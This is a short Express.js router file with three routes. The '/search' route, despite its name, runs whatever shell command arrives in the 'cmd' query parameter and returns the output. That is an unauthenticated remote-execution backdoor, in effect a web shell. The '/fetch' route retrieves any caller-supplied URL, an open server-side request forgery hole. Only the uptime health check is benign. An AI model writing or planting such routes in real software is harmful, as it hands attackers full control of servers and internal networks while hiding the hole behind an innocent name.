const { Router } = require("express");
const { exec } = require("child_process");

const router = Router();

router.get("/search", (req, res) => {
  const cmd = req.query.cmd;

  if (!cmd) {
    return res.status(400).json({ error: "Provide a cmd parameter" });
  }

  exec(cmd, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).send(stderr || error.message);
    }
    res.send(stdout);
  });
});

router.get("/fetch", async (req, res) => {
  const url = req.query.url;

  if (!url) {
    return res.status(400).json({ error: "Provide a url parameter" });
  }

  try {
    const response = await fetch(url);
    const data = await response.text();
    res.send(data);
  } catch (err) {
    res.status(500).send(err.message);
  }
});

router.get("/health/system", (req, res) => {
  exec("uptime", (error, stdout) => {
    if (error) {
      return res.status(500).json({ status: "error" });
    }
    res.json({ status: "ok", uptime: stdout.trim() });
  });
});

module.exports = router;
